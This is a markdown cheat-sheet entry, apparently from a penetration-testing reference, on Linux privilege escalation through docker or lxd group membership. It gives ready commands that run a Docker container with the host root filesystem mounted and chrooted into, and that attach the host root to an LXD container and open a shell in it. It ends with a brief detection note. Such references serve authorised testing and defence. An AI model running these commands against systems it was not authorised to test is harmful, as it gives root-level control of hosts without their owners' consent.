---
technique: Container Group Abuse
category: privilege-escalation
targets: Docker, LXD
protocols: Local, Docker API
remote_capable: false
tags: linux lpe docker lxd containers groups
---

# Container Group Abuse

Membership in container management groups can grant root-equivalent control over the host by mounting host filesystems or starting privileged containers.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Group membership | User must be in `docker`, `lxd`, or similar container admin group |
| Runtime access | Container runtime socket or CLI must be available |

## Linux

### Check groups

#sh #groups

Show current group memberships.

```sh title:"Show current groups"
id
```
<!-- cheat -->

### Docker socket

#sh #docker

Check Docker socket permissions.

```sh title:"Check Docker socket permissions"
ls -la /var/run/docker.sock
```
<!-- cheat -->

### Docker host mount

#sh #docker

Start a container with the host filesystem mounted.

```sh title:"Mount host filesystem in Docker container"
docker run --rm -it -v /:/host "$image_name" chroot /host /bin/sh
```
<!-- cheat
var image_name
-->

### LXD storage init

#sh #lxd

Initialize LXD storage with default settings.

```sh title:"Initialize LXD defaults"
lxd init --auto
```
<!-- cheat -->

### LXD host mount

#sh #lxd

Add the host filesystem as a disk device to a container.

```sh title:"Mount host filesystem into LXD container"
lxc config device add "$container_name" hostroot disk source=/ path=/host
```
<!-- cheat
var container_name
-->

### LXD shell

#sh #lxd

Open a shell in the container to access the mounted host filesystem.

```sh title:"Open LXD container shell"
lxc exec "$container_name" /bin/sh
```
<!-- cheat
var container_name
-->

## Detection

Monitor container runtime group membership, Docker socket access, privileged containers, and containers with host root mounted.
